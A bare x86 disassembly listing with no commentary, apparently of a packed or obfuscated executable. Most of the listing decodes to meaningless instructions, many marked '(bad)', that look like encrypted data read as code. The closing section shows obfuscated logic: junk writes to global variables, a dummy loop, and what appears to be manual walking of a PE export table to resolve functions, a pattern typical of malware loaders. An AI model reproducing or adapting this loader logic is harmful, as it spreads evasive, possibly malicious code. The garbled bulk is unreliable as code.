  404984:	jmp    0x5f7f7c
  404989:	aaa    
  40498a:	cwde   
  40498b:	pop    ebx
  40498c:	stc    
  40498d:	sub    eax,DWORD PTR [esi+0x74]
  404990:	mov    ah,0x7b
  404992:	or     BYTE PTR [ebp+0x42793652],bh
  404998:	adc    al,0x1f
  40499a:	and    edi,DWORD PTR [esi+0x3f]
  40499d:	retf   0x367f
  4049a0:	cli    
  4049a1:	add    ah,BYTE PTR [ebx-0x5a]
  4049a4:	pop    edi
  4049a5:	or     eax,esi
  4049a7:	xor    BYTE PTR [esi],ah
  4049a9:	cdq    
  4049aa:	jns    0x404a23
  4049ac:	fist   WORD PTR [ecx]
  4049ae:	xor    BYTE PTR [ebx-0x2283e3db],0xe1
  4049b5:	ss mov ch,cl
  4049b8:	(bad)  
  4049b9:	fistp  DWORD PTR [ecx-0x2d]
  4049bc:	into   
  4049bd:	jo     0x4049f5
  4049bf:	into   
  4049c0:	push   ds
  4049c1:	adc    esp,0x6d2fc0fc
  4049c7:	repnz cdq 
  4049c9:	and    al,0x25
  4049cb:	inc    eax
  4049cc:	imul   esp,DWORD PTR [esi+0x27c00ba4],0xae2b30be
  4049d6:	popf   
  4049d7:	xor    DWORD PTR [eax+0x52706dac],0x53
  4049de:	xlat   BYTE PTR ds:[ebx]
  4049df:	push   ecx
  4049e0:	mov    eax,0x1d9ddf8f
  4049e5:	das    
  4049e6:	inc    eax
  4049e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e8:	mov    ch,0x4d
  4049ea:	push   es
  4049eb:	fnsave [ebx+0x57]
  4049ee:	push   edi
  4049ef:	jno    0x4049a2
  4049f1:	pop    esp
  4049f2:	mov    ds:0x9255158d,eax
  4049f7:	in     al,0x72
  4049f9:	cli    
  4049fa:	dec    ebx
  4049fb:	pop    ebx
  4049fc:	add    BYTE PTR [edi+0xd],al
  4049ff:	mov    edi,0xc013558e
  404a04:	aad    0x73
  404a06:	jns    0x4049bb
  404a08:	push   edi
  404a09:	ror    DWORD PTR [edi-0x1e42183f],0x9f
  404a10:	mov    eax,0x3110ef97
  404a15:	sub    esi,ebx
  404a17:	cmp    bh,BYTE PTR [edi]
  404a19:	or     DWORD PTR [ecx],ecx
  404a1b:	or     BYTE PTR [eax-0x1867c30c],ch
  404a21:	(bad)  
  404a22:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  404a24:	fist   DWORD PTR [ecx+0x42]
  404a27:	fiadd  WORD PTR [edi+0x34]
  404a2a:	dec    ebx
  404a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a2c:	mov    eax,0xd5826ba
  404a31:	or     BYTE PTR ds:0xcd557438,bh
  404a37:	mov    ebp,DWORD PTR [edx+0x4f]
  404a3a:	push   ds
  404a3b:	xchg   BYTE PTR [esi-0x52241fa5],ch
  404a41:	pop    ebx
  404a42:	lods   eax,DWORD PTR ds:[esi]
  404a43:	lahf   
  404a44:	jecxz  0x4049f5
  404a46:	lds    ebp,FWORD PTR [edi+0x57b20299]
  404a4c:	lods   eax,DWORD PTR ds:[esi]
  404a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a4e:	push   esi
  404a4f:	hlt    
  404a50:	mov    esp,0xb5ca0ca4
  404a55:	iret   
  404a56:	pop    ss
  404a57:	imul   eax,ebx,0xe69e9902
  404a5d:	and    bh,BYTE PTR [ebx]
  404a5f:	out    dx,al
  404a60:	(bad)  
  404a61:	xor    DWORD PTR [esi+0x5e3181af],ebp
  404a67:	mov    bl,0x13
  404a69:	and    al,BYTE PTR [esi]
  404a6b:	stos   BYTE PTR es:[edi],al
  404a6c:	or     esi,ebp
  404a6e:	pop    esp
  404a6f:	call   0x7fb7:0x8cdd29e7
  404a76:	push   eax
  404a77:	jle    0x404a52
  404a79:	(bad)  
  404a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a7b:	jne    0x404ae6
  404a7d:	xor    eax,0xc9a8dbd8
  404a82:	rcl    BYTE PTR [esi],1
  404a84:	xchg   ebx,eax
  404a85:	push   ecx
  404a86:	test   dh,bl
  404a88:	mov    ebp,0xf03c5af3
  404a8d:	mov    dh,0x56
  404a8f:	fist   DWORD PTR [ebx]
  404a91:	pop    esi
  404a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a93:	cmp    dh,BYTE PTR [eax]
  404a95:	xchg   ecx,eax
  404a96:	add    al,0xcb
  404a98:	mov    esp,0x6e885bd7
  404a9d:	or     eax,0xf6d23155
  404aa2:	pushf  
  404aa3:	xor    ebx,edi
  404aa5:	imul   ebp,DWORD PTR [ebx-0x14],0xe4600a55
  404aac:	or     ah,BYTE PTR [ebx+0x34]
  404aaf:	mov    ecx,0x3ea2fcd8
  404ab4:	ret    0x2e08
  404ab7:	ss ret 0x4ab5
  404abb:	push   ds
  404abc:	mov    ebp,0x67a1c891
  404ac1:	imul   edi,DWORD PTR [ebx-0x4af1dcfb],0x147b6881
  404acb:	(bad)  
  404acc:	popf   
  404acd:	mov    dh,0xc1
  404acf:	loopne 0x404a79
  404ad1:	add    edi,DWORD PTR [eax]
  404ad3:	gs push ebx
  404ad5:	xchg   ecx,eax
  404ad6:	sti    
  404ad7:	dec    BYTE PTR [ecx]
  404ad9:	add    DWORD PTR [ebp-0x50dd141],0xfffffff3
  404ae0:	sbb    DWORD PTR [ebx+0x2169e1b4],eax
  404ae6:	mov    eax,ds:0x4d310cae
  404aeb:	sbb    bl,BYTE PTR [ebp-0x5fedef05]
  404af1:	fs test eax,0xec292e17
  404af7:	ret    0x8713
  404afa:	add    eax,0xabf8702
  404aff:	pop    ecx
  404b00:	(bad)  
  404b01:	adc    al,0x4a
  404b03:	in     eax,dx
  404b04:	retf   
  404b05:	ja     0x404af9
  404b07:	inc    ebp
  404b08:	lahf   
  404b09:	dec    ecx
  404b0a:	test   eax,0xc1abe0b4
  404b0f:	adc    bp,WORD PTR [ecx+0x264671bc]
  404b16:	jle    0x404b06
  404b18:	xchg   esi,eax
  404b19:	stc    
  404b1a:	call   0x35bd:0x58c173f1
  404b21:	pop    ss
  404b22:	lea    eax,[ebx]
  404b24:	popa   
  404b25:	icebp  
  404b26:	cmp    eax,0xc04b87c8
  404b2b:	in     eax,dx
  404b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b2d:	loope  0x404ad4
  404b2f:	(bad)  
  404b30:	mov    bh,0x45
  404b32:	retf   0x1587
  404b35:	mov    ecx,0x91491db8
  404b3a:	ss stos BYTE PTR es:[edi],al
  404b3c:	loop   0x404b6f
  404b3e:	add    eax,0xd9264c63
  404b43:	popa   
  404b44:	inc    ecx
  404b45:	jecxz  0x404ba8
  404b47:	and    eax,0xcd48f520
  404b4c:	mov    ds:0xd9728658,al
  404b51:	daa    
  404b52:	adc    al,dl
  404b54:	int3   
  404b55:	int    0xc0
  404b57:	pop    edi
  404b58:	pop    es
  404b59:	add    BYTE PTR [eax+0x10e1e5d0],bh
  404b5f:	loop   0x404af1
  404b61:	sbb    al,0xae
  404b63:	add    eax,0x72bfe2fb
  404b68:	cmp    esi,edx
  404b6a:	cmp    al,0x8d
  404b6c:	hlt    
  404b6d:	nop
  404b6e:	dec    ebp
  404b6f:	dec    edx
  404b71:	in     al,0xe0
  404b73:	iret   
  404b74:	mov    cl,0x1b
  404b76:	pusha  
  404b77:	jbe    0x404b9e
  404b79:	popa   
  404b7a:	pop    edi
  404b7b:	out    0xab,eax
  404b7d:	push   edi
  404b7e:	scas   eax,DWORD PTR es:[edi]
  404b7f:	ret    0xf2f3
  404b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b83:	mov    dl,0xfc
  404b85:	mov    dh,0xb
  404b87:	(bad)  
  404b88:	mov    edi,0x12cb3384
  404b8d:	lods   eax,DWORD PTR ss:[esi]
  404b8f:	sbb    cl,dh
  404b91:	mov    al,ds:0xf7979ea7
  404b96:	ins    DWORD PTR es:[edi],dx
  404b97:	mov    bh,0xd0
  404b99:	sbb    cl,0x24
  404b9c:	xchg   ebx,eax
  404b9d:	cmp    DWORD PTR [esi-0x29480e11],ebp
  404ba3:	inc    edi
  404ba4:	int    0xd6
  404ba6:	enter  0x6a86,0x21
  404baa:	mov    WORD PTR [edi-0xf],cs
  404bad:	pop    ebp
  404bae:	call   0x4e63ed78
  404bb3:	jle    0x404ba3
  404bb5:	push   0x5c
  404bb7:	lods   al,BYTE PTR ds:[esi]
  404bb8:	jp     0x404b9d
  404bba:	ins    BYTE PTR es:[edi],dx
  404bbb:	mov    ch,ah
  404bbd:	pop    ecx
  404bbe:	scas   al,BYTE PTR es:[edi]
  404bbf:	rcl    DWORD PTR [ebx+0x2f],cl
  404bc2:	stc    
  404bc3:	outs   dx,DWORD PTR ds:[esi]
  404bc4:	shr    DWORD PTR [ebx-0x1e1373a0],cl
  404bca:	lea    esi,[ecx+0x789365bf]
  404bd0:	jae    0x404b80
  404bd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bd3:	mov    BYTE PTR [ebp+0x545c54ce],al
  404bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bda:	mov    DWORD PTR [ebp+0x2d737257],ebx
  404be0:	cmc    
  404be1:	stos   BYTE PTR es:[edi],al
  404be2:	push   0x67
  404be4:	lock cli 
  404be6:	or     eax,0x9aa2873a
  404beb:	or     ah,bl
  404bed:	cmc    
  404bee:	(bad)  [ecx+0x3a]
  404bf1:	push   0x47
  404bf3:	cmp    al,0xae
  404bf5:	into   
  404bf6:	inc    esp
  404bf7:	std    
  404bf8:	pop    es
  404bf9:	push   edx
  404bfa:	aaa    
  404bfb:	jae    0x404c26
  404bfd:	sub    eax,0xcd1f8ce6
  404c02:	aaa    
  404c03:	sbb    esi,DWORD PTR [edi-0x39c14269]
  404c09:	push   edi
  404c0a:	lahf   
  404c0b:	mov    bl,0x1d
  404c0d:	jns    0x404c51
  404c0f:	repz jle 0x404bcc
  404c12:	fidiv  WORD PTR [esi-0x4]
  404c15:	jle    0x404bd1
  404c17:	in     al,0xce
  404c19:	jbe    0x404bcf
  404c1b:	sbb    cl,BYTE PTR [edx-0x6ebfafeb]
  404c21:	icebp  
  404c22:	sbb    eax,0x9f37e6d6
  404c27:	fs test al,0xab
  404c2a:	cmp    ebp,ebx
  404c2c:	mov    edi,ebx
  404c2e:	aaa    
  404c2f:	mov    ds:0xdeadd3b1,al
  404c34:	mov    cr1,esi
  404c37:	bound  eax,QWORD PTR [ebx+esi*4-0x5e]
  404c3b:	addr16 cwde 
  404c3d:	les    eax,FWORD PTR [ecx-0x33e7ad4e]
  404c43:	push   edx
  404c44:	sub    BYTE PTR [edi-0x1e8fd195],dh
  404c4a:	dec    ebx
  404c4b:	and    al,0xeb
  404c4d:	jmp    0x404cb8
  404c4f:	inc    eax
  404c50:	sub    DWORD PTR [edx+0x6c8b3851],esp
  404c56:	or     ecx,DWORD PTR [ecx]
  404c58:	mov    esp,0x88c80324
  404c5d:	inc    edi
  404c5e:	and    BYTE PTR [ecx+0x39],0x34
  404c62:	xor    ebp,0x10
  404c65:	or     eax,0x7a3d8c7d
  404c6a:	es sbb eax,0xab290dc0
  404c70:	cmc    
  404c71:	lea    ecx,[esi+0xb]
  404c74:	repnz cmp BYTE PTR [eax-0x3e],0xc6
  404c79:	pusha  
  404c7a:	jmp    0xc9f74cd8
  404c7f:	xor    dl,BYTE PTR [eax-0x60e2c6da]
  404c85:	lods   eax,DWORD PTR ds:[esi]
  404c86:	cwde   
  404c87:	xchg   ebp,eax
  404c88:	ins    DWORD PTR es:[edi],dx
  404c89:	pusha  
  404c8a:	shl    DWORD PTR [edi],1
  404c8c:	rol    dl,1
  404c8e:	inc    edx
  404c8f:	jnp    0x404cc8
  404c91:	or     esi,ecx
  404c93:	push   0xffffffc1
  404c95:	ins    BYTE PTR es:[edi],dx
  404c96:	adc    BYTE PTR ds:0x6c41e596,ch
  404c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c9d:	xchg   ecx,eax
  404c9e:	and    eax,DWORD PTR ds:0xa3859c12
  404ca4:	mov    esp,0x5a5c99d
  404ca9:	mov    ebx,0xce56d2e1
  404cae:	pop    ebp
  404caf:	nop
  404cb0:	pusha  
  404cb1:	xor    esp,DWORD PTR [ecx]
  404cb3:	sub    al,0xc3
  404cb5:	or     eax,0x9660f341
  404cba:	fdiv   QWORD PTR [ecx]
  404cbc:	pusha  
  404cbd:	sub    al,0x50
  404cbf:	pop    eax
  404cc0:	pop    edx
  404cc1:	mov    DWORD PTR [eax*2+0x8667948],ebx
  404cc8:	mov    bh,0x36
  404cca:	fimul  WORD PTR [edi]
  404ccc:	xor    eax,DWORD PTR [ebp-0x58]
  404ccf:	retf   0xc2b5
  404cd2:	fldcw  WORD PTR [ecx]
  404cd4:	mov    ebx,0x5ff71b12
  404cd9:	mov    esp,0xe8d5c288
  404cde:	aas    
  404cdf:	jmp    0x3bb84526
  404ce4:	dec    ebp
  404ce5:	cmc    
  404ce6:	int3   
  404ce7:	xchg   al,dl
  404ce9:	or     esp,0xffffffa4
  404cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ced:	not    esp
  404cef:	or     DWORD PTR [ebx+0x75f47d0e],edx
  404cf5:	mov    al,0x97
  404cf7:	in     al,0x3a
  404cf9:	mov    eax,0xa168cce9
  404cfe:	pusha  
  404cff:	push   ds
  404d00:	push   ebp
  404d01:	sbb    ebp,DWORD PTR [eax-0x10b4d838]
  404d07:	xchg   eax,esp
  404d09:	dec    esp
  404d0a:	in     al,dx
  404d0b:	lea    edx,ds:0xadc1c519
  404d11:	jge    0x404d28
  404d13:	pop    edi
  404d14:	sbb    ch,cl
  404d16:	out    dx,eax
  404d17:	xor    al,0x81
  404d19:	out    0x78,al
  404d1b:	in     al,dx
  404d1c:	enter  0x54aa,0xfa
  404d20:	fwait
  404d21:	cmp    eax,0x58585ab0
  404d26:	hlt    
  404d27:	pop    eax
  404d28:	and    DWORD PTR [ecx+0x32],edx
  404d2b:	adc    DWORD PTR [ecx+0x76],esi
  404d2e:	push   0x65
  404d30:	mov    edi,cs
  404d32:	xchg   ecx,eax
  404d33:	xor    bl,dl
  404d35:	daa    
  404d36:	mov    bh,0xba
  404d38:	jp     0x404d45
  404d3a:	retf   0x1a06
  404d3d:	mov    dh,0xdb
  404d3f:	mov    esi,0xe255db4d
  404d44:	mov    dl,0x33
  404d46:	lahf   
  404d47:	aaa    
  404d48:	mov    ?,ecx
  404d4a:	in     al,dx
  404d4b:	mov    edi,0x7d2ed6df
  404d50:	pusha  
  404d51:	ret    0xc320
  404d54:	aas    
  404d55:	es es cmc 
  404d58:	into   
  404d59:	add    ch,BYTE PTR [eax]
  404d5b:	lea    esp,[esi-0x36]
  404d5e:	dec    ecx
  404d5f:	jmp    0xe060d53c
  404d64:	pop    ebp
  404d65:	pop    esp
  404d66:	jae    0x404dac
  404d68:	mov    edi,0x6afcb9d3
  404d6d:	stc    
  404d6e:	add    esp,ebx
  404d70:	sbb    eax,0xa13e903f
  404d75:	lods   al,BYTE PTR ds:[esi]
  404d76:	push   cs
  404d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d78:	mov    BYTE PTR ss:[edi+ecx*1-0x14],dl
  404d7d:	add    al,0x1c
  404d7f:	and    DWORD PTR [eax],edx
  404d81:	and    DWORD PTR [ebx],esi
  404d83:	fstp   QWORD PTR [esp+edx*2]
  404d86:	test   BYTE PTR [edi+0x412f49f5],al
  404d8c:	and    edx,esp
  404d8e:	adc    bh,BYTE PTR [ebx-0x730ccf99]
  404d94:	cmp    BYTE PTR [edi-0x62bdda6a],dl
  404d9a:	mov    edi,0xc3ef0f0d
  404d9f:	cmp    eax,0x81ed7cd5
  404da4:	cmc    
  404da5:	sbb    ch,BYTE PTR [edi-0x7225f0ed]
  404dab:	(bad)  
  404dac:	cmp    esi,DWORD PTR [ecx]
  404dae:	and    ecx,DWORD PTR [esi-0x7f8351f9]
  404db4:	in     al,dx
  404db5:	or     eax,DWORD PTR fs:[eax-0x2d]
  404db9:	pusha  
  404dba:	mov    ebp,ds
  404dbc:	imul   esi,edx,0x71
  404dbf:	pop    edx
  404dc0:	sbb    edi,DWORD PTR [ebx]
  404dc2:	adc    eax,0xa8156499
  404dc7:	mov    ebp,0xb54ed013
  404dcc:	cmp    bl,al
  404dce:	arpl   si,bx
  404dd0:	jno    0x404dbf
  404dd2:	dec    ebp
  404dd3:	or     DWORD PTR [ebp+0x2bc3ad1f],edi
  404dd9:	aad    0x4f
  404ddb:	sbb    dh,bh
  404ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dde:	adc    dh,BYTE PTR [ecx+eiz*4]
  404de1:	call   DWORD PTR [ebp-0x10]
  404de4:	aad    0x95
  404de6:	xor    DWORD PTR [ebp+0x7f],ebp
  404de9:	inc    eax
  404dea:	ficom  DWORD PTR [edi+0x31]
  404ded:	adc    eax,0x74661c5b
  404df2:	pushf  
  404df3:	xchg   ecx,eax
  404df4:	xchg   esp,eax
  404df5:	dec    eax
  404df6:	cli    
  404df7:	or     BYTE PTR [eax+0x74a4f979],ch
  404dfd:	pop    edi
  404dfe:	mov    ah,0xb8
  404e00:	jb     0x404dac
  404e02:	push   edx
  404e03:	mov    al,0x98
  404e05:	fs jb  0x404dfb
  404e08:	fnstcw WORD PTR [eax-0x1]
  404e0b:	in     eax,dx
  404e0c:	sub    BYTE PTR [ecx+0x691b1177],cl
  404e12:	sub    ebx,eax
  404e14:	push   ebp
  404e15:	xchg   cx,ax
  404e17:	lock or al,0xe3
  404e1a:	out    0x6e,al
  404e1c:	dec    ecx
  404e1d:	adc    eax,0xb881597d
  404e22:	arpl   WORD PTR [edx-0x4e3724a9],bx
  404e28:	shl    BYTE PTR [esi+0x15],cl
  404e2b:	sub    eax,edi
  404e2d:	sub    al,0x8
  404e2f:	jp     0x404de1
  404e31:	call   0x9ed9b843
  404e36:	stc    
  404e37:	arpl   WORD PTR [edx+0x69],di
  404e3a:	(bad)  
  404e3b:	loop   0x404e50
  404e3d:	xchg   esi,eax
  404e3e:	pusha  
  404e3f:	inc    ebx
  404e40:	test   BYTE PTR [ebp-0x44],dh
  404e43:	(bad)  
  404e44:	cld    
  404e45:	stos   DWORD PTR es:[edi],eax
  404e46:	or     al,0x7c
  404e48:	cwde   
  404e49:	fistp  WORD PTR [ecx-0x4fc6fc8b]
  404e4f:	sar    ch,0x89
  404e52:	dec    esi
  404e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e54:	cld    
  404e55:	or     BYTE PTR [edx],0x83
  404e58:	sub    DWORD PTR [edi+0x7d0a9ea8],ebp
  404e5e:	(bad)  [ecx]
  404e60:	and    al,0xc8
  404e62:	pop    ebp
  404e63:	fmul   QWORD PTR [edx]
  404e65:	inc    eax
  404e66:	cmp    bh,BYTE PTR [ebx]
  404e68:	xor    ch,BYTE PTR [edi-0x5]
  404e6b:	test   al,0x8f
  404e6d:	fcomp  DWORD PTR [ecx+0x3b]
  404e70:	cld    
  404e71:	xchg   esp,eax
  404e72:	int    0xcc
  404e74:	mov    cl,0xa6
  404e76:	mov    eax,ds:0x7fa6e27d
  404e7b:	and    eax,0x27466d8f
  404e80:	repz and DWORD PTR [edi+esi*2],edi
  404e84:	inc    esp
  404e85:	fcom   DWORD PTR [edx]
  404e87:	lds    edx,FWORD PTR ss:[ebx-0x7]
  404e8b:	dec    edi
  404e8c:	pushf  
  404e8d:	sbb    BYTE PTR [esi-0x65],ch
  404e90:	int    0x3e
  404e92:	aad    0x4a
  404e94:	sub    BYTE PTR [ebp+0x3],dl
  404e97:	(bad)  
  404e99:	(bad)  
  404e9a:	jg     0x404e8b
  404e9c:	mov    BYTE PTR [ebx+0x37],al
  404e9f:	pop    ebp
  404ea0:	push   eax
  404ea1:	repz mov cl,0x55
  404ea4:	js     0x404e9f
  404ea6:	xchg   DWORD PTR [ecx],esi
  404ea8:	add    dl,BYTE PTR [ecx+0x70b4bf1c]
  404eae:	cdq    
  404eaf:	fld    DWORD PTR [ecx]
  404eb1:	sub    DWORD PTR [ebx+0x65c046b9],ebp
  404eb7:	nop
  404eb8:	cpuid  
  404eba:	add    BYTE PTR [eax+0xc],dl
  404ebd:	fild   DWORD PTR [eax-0x6cc5d9d2]
  404ec3:	sbb    al,0x0
  404ec5:	and    DWORD PTR [edi+0x39],eax
  404ec8:	sbb    eax,0xf5aacc32
  404ecd:	fdivr  QWORD PTR [ecx+0x72]
  404ed0:	fnstsw WORD PTR [edx-0x46]
  404ed3:	aaa    
  404ed4:	push   ebx
  404ed5:	inc    ebx
  404ed6:	pop    edi
  404ed7:	clc    
  404ed8:	mov    cl,0x12
  404eda:	(bad)  
  404edb:	iret   
  404edc:	adc    edi,DWORD PTR [edi+ebp*4-0x36a0f92c]
  404ee3:	xchg   esp,eax
  404ee4:	jp     0x404f34
  404ee6:	sar    DWORD PTR [edi],0x8f
  404ee9:	jnp    0x404f59
  404eeb:	cmc    
  404eec:	hlt    
  404eed:	dec    edi
  404eee:	push   ss
  404eef:	aam    0x88
  404ef1:	xchg   ecx,eax
  404ef2:	xor    BYTE PTR [ecx],0x43
  404ef5:	imul   edi,DWORD PTR [edi+edx*1],0xa7e12f65
  404efc:	and    DWORD PTR [eax-0x73],edi
  404eff:	sbb    bl,BYTE PTR [edi+ebp*8]
  404f02:	jbe    0x404eb2
  404f04:	outs   dx,BYTE PTR ds:[esi]
  404f06:	repnz push edx
  404f08:	nop
  404f09:	mov    ds,WORD PTR [ecx-0x7a]
  404f0c:	in     al,dx
  404f0d:	(bad)  
  404f0e:	jb     0x404f19
  404f10:	xor    cl,bl
  404f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f13:	daa    
  404f14:	cmc    
  404f15:	inc    esp
  404f16:	ror    esp,cl
  404f18:	sbb    ah,bl
  404f1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f1b:	(bad)  
  404f1c:	pop    ebx
  404f1d:	mov    edx,0xa4d27e80
  404f22:	inc    ecx
  404f23:	jmp    FWORD PTR [eax-0x6615969b]
  404f29:	push   ss
  404f2a:	push   es
  404f2b:	mov    ?,WORD PTR [ecx]
  404f2d:	pushf  
  404f2e:	jle    0x404f9c
  404f30:	int    0x54
  404f32:	stos   DWORD PTR es:[edi],eax
  404f33:	loop   0x404ed1
  404f35:	sub    al,0xaf
  404f37:	sbb    eax,0xa2c2388
  404f3c:	pop    esp
  404f3d:	mov    ebx,0xf8f97c39
  404f42:	sbb    DWORD PTR [edx-0x10b1e241],0xffffffe7
  404f49:	mov    WORD PTR ds:0x1ee59571,es
  404f4f:	add    BYTE PTR [ebp-0x57],al
  404f52:	daa    
  404f53:	lods   al,BYTE PTR ds:[esi]
  404f54:	push   cs
  404f55:	jl     0x404f8e
  404f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f58:	popf   
  404f59:	dec    eax
  404f5a:	hlt    
  404f5b:	neg    BYTE PTR [edx-0x4e]
  404f5e:	repnz xchg edx,eax
  404f60:	sbb    al,0xf8
  404f62:	stos   BYTE PTR es:[edi],al
  404f63:	call   0xa664ca34
  404f68:	ror    DWORD PTR [edx+eax*4-0x606c9bf6],cl
  404f6f:	or     al,0xb0
  404f71:	fstp   DWORD PTR es:[ecx+0x40c536a]
  404f78:	smsw   WORD PTR [esi+0x60231a39]
  404f7f:	sub    edx,DWORD PTR [eax+ebp*1-0x7a357d89]
  404f86:	xchg   BYTE PTR ds:0xf335ca3c,bh
  404f8c:	test   eax,0x5e0370e1
  404f91:	push   es
  404f92:	js     0x404f77
  404f94:	lock cli 
  404f96:	add    edi,0x427ee45a
  404f9c:	ror    edx,0x5e
  404f9f:	mov    bl,BYTE PTR [ecx-0x30]
  404fa2:	not    DWORD PTR [esi+0x24]
  404fa5:	add    edx,DWORD PTR [eax+ebp*2]
  404fa8:	pop    ebp
  404fa9:	dec    edi
  404faa:	cmp    BYTE PTR [ecx-0xcdd20d8],0x3f
  404fb1:	gs jle 0x405011
  404fb4:	sub    DWORD PTR [esi],edi
  404fb6:	or     al,0x72
  404fb8:	dec    esi
  404fb9:	and    DWORD PTR [ebx+ebx*4+0x6],ecx
  404fbd:	sub    DWORD PTR [edx+0xb],0xffffffe1
  404fc1:	in     al,dx
  404fc2:	call   0xe8f8:0x44326f98
  404fc9:	push   esi
  404fca:	retf   0x52af
  404fcd:	adc    eax,0xe468c14a
  404fd2:	jmp    0x404f69
  404fd4:	in     al,0x7
  404fd6:	add    al,0xfa
  404fd8:	enter  0x7c71,0x68
  404fdc:	push   ebp
  404fdd:	sbb    dl,BYTE PTR [edx+0x26b0730b]
  404fe3:	dec    esp
  404fe4:	mov    ah,0x71
  404fe6:	outs   dx,BYTE PTR ds:[esi]
  404fe7:	add    al,0x57
  404fe9:	loope  0x404f6d
  404feb:	sbb    edx,edi
  404fed:	dec    esp
  404fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fef:	cmp    ch,ch
  404ff1:	push   ebp
  404ff2:	or     BYTE PTR [ebp+0x5087e8a4],0x46
  404ff9:	cld    
  404ffa:	jmp    0x7800c4fe
  404fff:	jne    0x405073
  405001:	mov    bh,0xa8
  405003:	and    cl,BYTE PTR [esi+0xae505c7]
  405009:	scas   eax,DWORD PTR es:[edi]
  40500a:	sbb    DWORD PTR [ebx-0x6df7aba5],ebp
  405010:	aad    0x6
  405012:	rol    ah,cl
  405014:	mov    ch,0x49
  405016:	shr    BYTE PTR [edi-0x5],1
  405019:	ror    DWORD PTR [ebp-0x6eb0720c],0x22
  405020:	hlt    
  405021:	cwde   
  405022:	jmp    0xf792:0xe39c47b1
  405029:	jecxz  0x405006
  40502b:	jmp    0xcecdabc
  405030:	(bad)  
  405031:	test   DWORD PTR [eax+edx*1-0x76],edi
  405035:	aam    0x5e
  405037:	inc    eax
  405038:	idiv   BYTE PTR [ebx]
  40503a:	enter  0x840f,0x4a
  40503e:	add    al,BYTE PTR [eax]
  405040:	add    BYTE PTR [ecx+0x42b01805],al
  405046:	add    BYTE PTR [eax],cl
  405048:	rol    BYTE PTR [edx+0x0],0xff
  40504c:	jne    0x40503a
  40504e:	xor    DWORD PTR ds:0x42b00c,0x3dbe
  405058:	push   DWORD PTR [ebp+0x8]
  40505b:	call   0x40c78f
  405060:	sbb    ecx,0x6495
  405066:	mov    DWORD PTR [ebp-0x14],eax
  405069:	or     DWORD PTR ds:0x42901c,ebx
  40506f:	mov    eax,DWORD PTR [ebp-0x4]
  405072:	mov    ecx,DWORD PTR [ebp-0x14]
  405075:	adc    DWORD PTR ds:0x42d00c,0x15e5
  40507f:	xor    eax,esi
  405081:	add    eax,edi
  405083:	mov    DWORD PTR ds:0x42b004,0x7edf
  40508d:	cmp    ecx,eax
  40508f:	mov    DWORD PTR ds:0x42d014,0x1e10
  405099:	je     0x40528b
  40509f:	mov    eax,DWORD PTR [ebp-0x14]
  4050a2:	mov    ecx,DWORD PTR ds:0x429010
  4050a8:	sbb    DWORD PTR ds:0x42c00c,ecx
  4050ae:	mov    eax,DWORD PTR [eax+0x18]
  4050b1:	mov    DWORD PTR [ebp-0x2c],eax
  4050b4:	add    ecx,ecx
  4050b6:	mov    eax,DWORD PTR [ebp-0x14]
  4050b9:	sbb    DWORD PTR ds:0x42c01c,0x4c1
  4050c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4050c6:	xor    DWORD PTR ds:0x42b000,0x3fa3
  4050d0:	add    ecx,DWORD PTR [eax+0x20]
  4050d3:	xor    eax,0x40df
  4050d8:	mov    DWORD PTR [ebp-0x34],ecx
  4050db:	or     ecx,eax
  4050dd:	mov    eax,DWORD PTR [ebp-0x14]
  4050e0:	xor    DWORD PTR ds:0x429008,ecx
  4050e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4050e9:	and    DWORD PTR ds:0x42a008,0x42d014
  4050f3:	add    ecx,DWORD PTR [eax+0x24]
  4050f6:	mov    DWORD PTR [ebp-0x3c],ecx
  4050f9:	movzx  eax,BYTE PTR ds:0x42c000
  405100:	sbb    DWORD PTR ds:0x429010,eax
  405106:	mov    eax,DWORD PTR [ebp-0x14]
  405109:	mov    DWORD PTR ds:0x42d004,0x14
  405113:	cmp    DWORD PTR ds:0x42d004,0x0
  40511a:	je     0x405176
  405120:	cmp    DWORD PTR ds:0x42d004,0x9
  405127:	jne    0x405142
  40512d:	push   0x42e0f9
  405132:	push   0x42e0c7
  405137:	push   0x400000
  40513c:	call   DWORD PTR ds:0x42e9c7
  405142:	cmp    DWORD PTR ds:0x42d004,0xa
  405149:	jne    0x40515c
  40514f:	mov    ecx,DWORD PTR ds:0x42d004
  405155:	dec    ecx
  405156:	mov    DWORD PTR ds:0x42d004,ecx
  40515c:	xor    ecx,ecx
  40515e:	or     ecx,DWORD PTR ds:0x42d004
  405164:	dec    ecx
  405165:	mov    DWORD PTR ds:0x42d004,ecx
  40516b:	jmp    0x405113
  405170:	inc    DWORD PTR ds:0x42b00c
  405176:	mov    ecx,DWORD PTR [ebp+0x8]
  405179:	add    ecx,DWORD PTR [eax+0x1c]
  40517c:	mov    DWORD PTR [ebp-0x14],ecx
  40517f:	jmp    0x405253
  405184:	sub    DWORD PTR ds:0x42c018,ebx
  40518a:	mov    eax,DWORD PTR [ebp-0x34]
  40518d:	mov    ecx,DWORD PTR [ebp+0x8]
  405190:	sbb    DWORD PTR ds:0x42a014,0x429000
  40519a:	add    ecx,DWORD PTR [eax+ebx*4]
  40519d:	and    DWORD PTR ds:0x42d00c,0x0
  4051a7:	jmp    0x4051b7
